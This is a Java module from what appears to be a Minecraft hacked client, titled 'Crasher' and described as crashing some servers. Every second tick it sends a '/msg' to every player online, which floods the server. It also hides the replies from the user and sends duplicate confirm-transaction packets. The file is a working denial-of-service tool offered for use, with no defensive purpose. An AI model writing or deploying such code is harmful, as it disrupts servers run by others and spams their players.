package libayon.module.modules.exploit;

import libayon.BattleBonk;
import libayon.event.events.client.UpdateEvent;
import libayon.event.events.packets.PacketReceivedEvent;
import libayon.event.events.packets.PacketSentEvent;
import libayon.module.Category;
import libayon.module.Mode;
import libayon.module.Module;
import libayon.utils.network.PacketUtils;
import net.minecraft.client.network.NetworkPlayerInfo;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.C01PacketChatMessage;
import net.minecraft.network.play.client.C0FPacketConfirmTransaction;
import net.minecraft.network.play.server.S02PacketChat;

public class Crasher extends Module {
    private final BattleBonk bb = BattleBonk.instance;

    public Crasher() {
        super("Crasher", "Crashes some servers", 0, Category.EXPLOIT, Mode.BATTLEASYA);
    }

    @Override
    public void onDisable() {
    }

    @Override
    public void onEnable() {
    }

    @Override
    public void onUpdate(UpdateEvent e) {
        switch (getMode()) {
            case BATTLEASYA:
                if (mc.thePlayer.ticksExisted % 2 != 0) return;
                int count = 0;
                for (NetworkPlayerInfo ent : mc.getNetHandler().getPlayerInfoMap()) {
                    if (ent == null) continue;
                    if (ent.getGameProfile().getName().contains(mc.thePlayer.getName())) continue;
                    PacketUtils.sendPacketNoEvent(new C01PacketChatMessage("/msg " + ent.getGameProfile().getName() + " Crash Test"));
                    count++;
                }
                System.out.println(count);
                break;
        }
    }

    @Override
    public void onPacketSent(PacketSentEvent e) {
        Packet p = e.getPacket();
        if (p instanceof C0FPacketConfirmTransaction) {
            C0FPacketConfirmTransaction c0f = (C0FPacketConfirmTransaction) p;
            PacketUtils.sendPacketNoEvent(c0f);
        }
    }

    @Override
    public void onPacketReceived(PacketReceivedEvent e) {
        Packet p = e.getPacket();
        if (p instanceof S02PacketChat) {
            S02PacketChat s02 = (S02PacketChat) p;
            if (s02.getChatComponent().getUnformattedText().contains("Crash") || s02.getChatComponent().getUnformattedText().contains("has messages disabled."))
                e.setCancelled(true);
        }
    }

}
